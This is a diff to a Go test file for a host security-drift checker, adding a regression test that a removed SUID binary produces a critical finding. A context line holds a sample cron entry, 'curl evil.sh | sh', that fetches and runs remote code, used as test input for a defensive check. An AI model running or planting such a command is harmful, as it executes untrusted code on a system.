@@ -261,6 +261,15 @@ func TestCheckSecurityDrift_AddedRemovedSSHAndCron(t *testing.T) {
 	assertLevel(t, checkSecurityDrift(&baseline.SecurityDiff{NewCronEntries: []string{"* * * * * curl evil.sh | sh"}}), "WARN")
 }
 
+// TestCheckSecurityDrift_RemovedSUIDs is the regression test for
+// internal-baseline-01-02: a removed SUID binary must drive a CRIT insight
+// (and therefore HasChanges()==true, since checkSecurityDrift is gated on
+// it) — previously it produced zero insights, identical to no drift at all.
+func TestCheckSecurityDrift_RemovedSUIDs(t *testing.T) {
+	t.Parallel()
+	assertLevel(t, checkSecurityDrift(&baseline.SecurityDiff{RemovedSUIDs: []string{"/usr/bin/su"}}), "CRIT")
+}
+
 func TestCheckAuth_TopSourceHint(t *testing.T) {
 	t.Parallel()
 	a := models.AuthInfo{
